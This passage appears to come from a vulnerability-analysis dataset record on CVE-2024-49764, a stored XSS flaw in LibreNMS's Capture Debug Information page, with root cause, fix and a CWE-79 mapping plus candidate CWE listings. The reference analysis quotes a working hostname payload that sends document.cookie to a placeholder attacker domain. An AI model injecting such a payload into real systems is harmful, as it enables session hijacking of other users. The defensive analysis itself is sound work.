  "description": "LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. A **Stored Cross-Site Scripting** (XSS) vulnerability in the Capture Debug Information page allows authenticated users to inject arbitrary JavaScript through the hostname parameter when creating a new device. This vulnerability results in the execution of malicious code when the Capture Debug Information page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain. This vulnerability is fixed in 24.10.0.",

  "reference_content": "Based on the provided content, here's an analysis of CVE-2024-49764:\n\n**Root Cause of Vulnerability:**\n\n- The root cause is insufficient sanitization of the `hostname` parameter when creating a new device in LibreNMS. This unsanitized input is later used in the \"Capture Debug Information\" page.\n- Specifically, the `url` variable, derived from the `hostname` parameter, was not properly sanitized before being included in the HTML of the \"Capture Debug Information\" page.\n\n**Weaknesses/Vulnerabilities Present:**\n\n- **Stored Cross-Site Scripting (XSS):** The primary weakness is the presence of a stored XSS vulnerability. An attacker can inject malicious JavaScript code through the `hostname` parameter.\n- **Insufficient Input Sanitization:** The application fails to sanitize user-provided input (`hostname`) before rendering it in the HTML context.\n\n**Impact of Exploitation:**\n\n- **Arbitrary JavaScript Execution:** An attacker can execute arbitrary JavaScript code in the context of other users' sessions when they visit the \"Capture Debug Information\" page for a compromised device.\n- **User Redirection:** The injected script can redirect the user to a malicious domain.\n- **Cookie Theft:** The attacker can capture non-HttpOnly cookies, potentially compromising the user's account and enabling unauthorized actions.\n\n**Attack Vectors:**\n\n- **Network:** The attack vector is network-based, meaning an attacker can exploit this vulnerability remotely over the network.\n- **HTTP POST Request:** The attacker injects the malicious payload through a POST request when creating a new device. The specific parameter is the `hostname` field.\n- **\"Capture Debug Information\" Page:** The vulnerability is triggered when a victim navigates to the \"Capture Debug Information\" page for the device with the injected payload.\n\n**Required Attacker Capabilities/Position:**\n\n- **Authenticated User:** The attacker needs to be an authenticated user to create a device, enabling the malicious hostname injection.\n- **Knowledge of Target Application:** The attacker must be aware of the vulnerable parameter and the context where the unsanitized data is rendered (the \"Capture Debug Information\" page).\n- **Ability to Create Devices:** The attacker needs the privilege to create new devices. This is mentioned in the \"Privileges required\" CVSS base metrics as High.\n\n**Additional Details:**\n\n- **Vulnerable Code Location:** The vulnerability is located in `librenms/includes/html/pages/device/capture.inc.php`.\n- **Vulnerable versions:** Affects versions <= 24.9.1\n- **Patched versions:** Fixed in version 24.10.0\n- **CVSS Score:** The vulnerability has a CVSS v3 base score of 7.5.\n- **Payload example:** The following payload can be injected into the hostname parameter when creating a new device `test'\" autofocus onfocus=\"document.location='https://<attacker_domain>/logger.php?c='+document.cookie\"`.\n- **Mitigation:** The fix includes using the `htmlentities()` function to properly encode the `hostname` variable before rendering in the HTML. This was implemented in commit `af15eabbb1752985d36f337cecf137a947e170f6`.\n- **CWE:** The vulnerability is classified as CWE-79 (Improper Neutralization of Input During Web Page Generation ['Cross-site Scripting']).\n\nIn summary, CVE-2024-49764 is a stored XSS vulnerability in LibreNMS that allows authenticated users to inject malicious scripts via the `hostname` parameter when creating a device. This script executes when a user visits the \"Capture Debug Information\" page of the device, leading to potential user compromise. The vulnerability is due to lack of proper input sanitization and is fixed by encoding the output using `htmlentities()` function.",

While CWE-116 is a broader class, CWE-79 is a more specific base class that directly addresses the vulnerability described. CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)) is a variant of CWE-79 but applies specifically to script-related HTML tags, which is pertinent to the XSS nature of the vulnerability, but CWE-79 describes the issue more accurately. The chain relationship of CanPrecede connects CWE-184 to CWE-79, but this is a less direct mapping for this vulnerability description. CWE-1004 is related to the impact and is a good secondary candidate.\n\n```mermaid\ngraph TD\n    cwe79[\"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"]\n    cwe116[\"CWE-116: Improper Encoding or Escaping of Output\"]\n    cwe80[\"CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\"]\n    cwe1004[\"CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\"]\n\n    cwe79 -->|CHILDOF| cwe116\n    cwe80 -->|CHILDOF| cwe79\n\n    classDef primary fill:#f96,stroke:#333,stroke-width:2px\n    classDef secondary fill:#69f,stroke:#333\n    class cwe79 primary\n    class cwe116,cwe80,cwe1004 secondary\n```\n\n## Vulnerability Chain\nThe vulnerability chain starts with the **improper** or **insufficient sanitization** of the `hostname` parameter (CWE-79). This leads to the ability to inject arbitrary JavaScript. The injected script can then redirect users to an attacker-controlled domain and steal non-HttpOnly cookies (CWE-1004).\n\n## Summary of Analysis\nThe initial analysis strongly points to CWE-79 (Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')) as the primary weakness. The vulnerability description explicitly mentions a \"Stored Cross-Site Scripting\" vulnerability, and the CVE Reference Links Content Summary confirms the root cause as insufficient sanitization of the `hostname` parameter. The provided evidence includes the vulnerable code location and the mitigation implemented, solidifying the choice of CWE-79. The relationship analysis further supports this decision, considering the parent-child relationships with other CWEs like CWE-116 and CWE-80, but selecting CWE-79 as the most specific and relevant base class. The inclusion of CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag) is based on the impact of the vulnerability, where the attacker can steal non-HttpOnly cookies.\n\nRelevant CWE Information:\n\n# Enhanced Context (25 CWEs)\nThe following CWEs were identified as potentially relevant to this vulnerability:\n\n## CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n**Abstraction Level**: Class\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nThe product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.\n\n**Mapping Guidance**:\n- Usage: Discouraged\n- Rationale: CWE-74 is high-level and often misused when lower-level weaknesses are more appropriate.\n\n## CWE-294: Authentication Bypass by Capture-replay\n**Abstraction Level**: Base\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nA capture-replay flaw exists when the design of the product makes it possible for a malicious user to sniff network traffic and bypass authentication by replaying it to the server in question to the same effect as the original message (or with minor changes).\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)\n**Abstraction Level**: Variant\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nThe product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as \"<\", \">\", and \"&\" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n**Abstraction Level**: Base\n**Similarity Score**: 0.74\n**Source**: dense\n\n**Description**:\nThe product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n**Abstraction Level**: Base\n**Similarity Score**: 0.73\n**Source**: dense\n\n**Description**:\nThe product stores, transfers, or shares a resource that contains sensitive information, but it does not properly remove that information before the product makes the resource available to unauthorized actors.\n\n**Mapping Guidance**:\n- Usage: Allowed\n- Rationale: This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n\n## CWE-116: Improper Encoding or Escaping of Output\n**Abstraction Level**: Class\n**Similarity Score**: 0.73\n**Source**: dense\n\n**Description**:\nThe product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly.
